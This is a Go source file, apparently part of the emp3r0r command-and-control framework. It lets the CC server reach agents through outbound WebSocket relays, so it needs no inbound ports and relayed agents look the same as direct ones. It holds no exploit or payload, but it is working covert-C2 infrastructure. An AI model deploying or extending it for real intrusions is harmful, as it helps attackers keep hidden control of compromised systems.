// Package server — relay_listener_cc.go
//
// CC-side rendezvous relay support: when cdn_proxy (or a new config field)
// points at a worker_ws relay URL with role=cc, the CC dials OUT to the
// relay and serves agents through it — zero inbound ports required.
//
// Config: emp3r0r.json → "relay_urls": ["wss://host/ws/<room>?role=cc&secret=...", ...]
// Multiple URLs = multi-homed CC (one goroutine per relay, isolation per account).
package server

import (
	"context"

	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// StartRelayListeners launches one virtual listener per relay URL.
// Each accepted virtual conn is fed into the same CBOR stream pipeline
// as the raw TLS server, so agents connecting through relays are
// indistinguishable from direct ones at the protocol layer.
func StartRelayListeners(ctx context.Context, relayURLs []string) {
	for _, u := range relayURLs {
		go func(url string) {
			l, err := transport.NewRelayListener(url)
			if err != nil {
				logging.Errorf("relay listener %s: %v", url, err)
				return
			}
			logging.Successf("🔗 Relay tunnel established: %s", maskSecret(url))
			go func() {
				<-ctx.Done()
				_ = l.Close()
			}()
			serveRelayListener(l)
		}(u)
	}
}

// serveRelayListener accepts virtual conns from a relay and hands them to
// the standard CBOR transport pipeline.
func serveRelayListener(l *transport.RelayListener) {
	for {
		conn, err := l.Accept()
		if err != nil {
			logging.Warningf("relay listener closed: %v", err)
			return
		}
		go func(c interface{ Read([]byte) (int, error); Write([]byte) (int, error); Close() error }) {
			stream := transport.NewStreamTransport(c, "relay")
			cborStreamAccept(stream)
		}(conn)
	}
}

// maskSecret hides the secret query parameter in logs.
func maskSecret(url string) string {
	// best-effort: cut at '&secret='
	for i := 0; i+8 <= len(url); i++ {
		if url[i:i+8] == "&secret=" {
			return url[:i+8] + "***"
		}
	}
	return url
}
